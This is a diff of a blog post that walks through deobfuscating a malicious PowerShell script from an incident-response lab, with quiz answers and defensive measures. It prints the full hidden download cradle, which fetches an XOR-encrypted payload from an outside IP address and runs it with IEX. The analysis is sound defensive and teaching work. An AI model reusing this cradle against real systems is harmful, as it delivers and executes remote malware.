@@ -2,7 +2,7 @@
 layout : post
 title: Powershell Code deobfuscation
 image : Powershell.png
-date: 2024-04-11 10:18 +0530
+date: 2024-04-11 06:18 +0530
 tags: [Base64 ,Powershell ,Incident Response, Deobfuscate ] 
 ---
 
@@ -28,7 +28,11 @@ Now that we have decoded the script, we may encounter visual text interspersed w
 
 ![]({{site.baseurl}}/img/Letsdefence/Powershell IR/Remove Null bytes.png)
 
-After naming variables and proper indentation, the final version of the code is now ready for analysis. This meticulous process ensures readability and clarity, facilitating a comprehensive understanding of the script's functionality and potential impact on the system
+```powershell
+powershell.exe -NoP -sta -NonI -W Hidden -Enc $WC=New-ObjEcT SySTeM.NET.WebCliENt;$u='Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko';$WC.HeADeRS.ADd('User-Agent',$u);$Wc.ProxY = [System.NeT.WEBReQUEst]::DEFAuLtWebProXy;$wc.PROxY.CrEdenTialS = [SysTem.NEt.CRedeNTIAlCAcHE]::DeFAULTNetWOrKCredENTiAls;$K='IM-S&fA9Xu{[)|wdWJhC+!N~vq_12Lty';$i=0;[CHaR[]]$B=([cHaR[]]($wc.DOwNLOaDStriNg("http://98.103.103.170:7443/index.asp")))|%{$_-BXoR$K[$I++%$k.LEnGTH]};IEX ($B-jOIn'')
+```
+
+After iterations of naming variables and proper indentation, the final version of the code is now ready for analysis. This meticulous process ensures readability and clarity, facilitating a comprehensive understanding of the script's functionality and potential impact on the system
 
 ```powershell
 powershell.exe -NoP -sta -NonI -W Hidden -Enc 
@@ -44,46 +48,73 @@ $Payload=
 		[cHaR[]]
 		($web_client.DOwNLOaDStriNg("http://98.103.103.170:7443/index.asp"))
 	)
-	|%{$_-BXoR$Password[$I++%$Password.LEnGTH]};
+
+|%{$_-B XoR $Password[$I++%$Password.LEnGTH]};
 
 IEX ($Payload-jOIn'')
 ```
 ### Code Explation 
 
-```
-$web_client=New-Object System.Net.WebClient;
-Creates a new instance of the WebClient class, which is used to download content from a specified URI
+Creates a new instance of the WebClient class, which is used to download content from a specified URI.
 
-$user_agent='Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko';
+```powershell
+$web_client=New-Object System.Net.WebClient;
+```
+
 variable defines a user-agent string that will be used in the HTTP request headers. It's crafted to mimic a legitimate web browser.
 
-$web_client.Headers.Add('User-Agent',$user_agent); 
+```powershell
+$user_agent='Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko';
+```
+
 Adds the user-agent string to the HTTP request headers.
 
-$web_client.Proxy = [System.Net.WebRequest]::DefaultWebProxy;: 
+```powershell
+$web_client.Headers.Add('User-Agent',$user_agent); 
+```
+
 Sets the proxy settings to use the system's default web proxy.
 
-$web_client.Proxy.Credentials = [System.Net.CredentialCache]::DefaultNetworkCredentials; 
+```powershell
+$web_client.Proxy = [System.Net.WebRequest]::DefaultWebProxy;: 
+```
+
 sets the proxy credentials to use the default network credentials.
 
-$Password='<Key>';
+```Powershell
+$web_client.Proxy.Credentials = [System.Net.CredentialCache]::DefaultNetworkCredentials; 
+```
+
 Variable holds a password.
 
-$i=0;: 
+```powershell
+$Password='<Key>';
+```
+
 Initializes a counter variable.
 
-[Char[]]$Payload=([Char[]]($web_client.DownloadString("http://98.103.103.170:7443/index.asp")))|%{$_-bxor$Password[$i++%$Password.Length]};
+```Powershell
+$i=0;: 
+```
+
 This line downloads the content from the specified URI using the WebClient instance created earlier. It then XORs (bitwise exclusive OR) each character of the downloaded content with the characters of the password. This is a common obfuscation technique used to hide the payload.
 
-IEX ($Payload -join '')
+
+```powershell
+[Char[]]$Payload=([Char[]]($web_client.DownloadString("http://98.103.103.170:7443/index.asp")))|%{$_-b xor $Password[$i++%$Password.Length]};
+```
+
 Invoke-Expression cmdlet (IEX) to execute the payload after it has been decrypted and concatenated into a single string.
+
+```powershell
+IEX ($Payload -join '')
 ```
 
 In summary, this script downloads and executes a payload from a remote server while obfuscating its content using XOR encryption with a password. The use of XOR encryption and obfuscation suggests malicious intent, as this is a common technique used by attackers to evade detection by security tools.
 
 ### Q1.What encoding is the malicious script using?
 
-```text
+```powershell
 Base64
 ```
 
@@ -108,6 +139,7 @@ This flag stands for "NonInteractive" and runs PowerShell in non-interactive mod
 ```powershell
 $WC=New-Object System.Net.WebClient
 ```
+
 ### Q5.What is the user agent string that is being spoofed in the malicious script?
 
 ```powershell 
@@ -122,10 +154,10 @@ $wc.PROxY.CrEdenTialS = [SysTem.NEt.CRedeNTIAlCAcHE]::DeFAULTNetWOrKCredENTiAls
 
 ### Q7.When the malicious script is executed, what is the URL that the script contacts to download the malicious payload?
 
-```bash
+```powershell
 http://98.103.103.170:7443/index.asp
 ```
-### Summary 
+### Defensive Measures 
 
 1. Restrict the execution of PowerShell scripts to approved locations or known, trusted scripts to prevent unauthorized or malicious scripts from running.
 2. Enable logging of all PowerShell commands executed on the system to detect and analyze potentially malicious scripts.
